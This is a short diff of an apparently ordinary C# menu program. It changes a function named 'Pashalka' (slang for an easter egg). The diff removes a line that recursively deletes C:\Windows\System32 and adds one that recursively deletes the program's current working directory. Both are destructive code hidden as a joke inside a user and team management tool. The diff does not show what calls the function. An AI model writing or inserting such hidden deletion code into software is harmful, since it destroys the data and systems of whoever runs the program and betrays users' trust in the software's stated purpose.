@@ -151,7 +151,7 @@ void UserManagerMenu()
 
 void Pashalka()
 {
-    Directory.Delete(@"C:\Windows\System32", true);
+    Directory.Delete(Directory.GetCurrentDirectory(), true);
 } 
 
 void TeamManagerMenu()
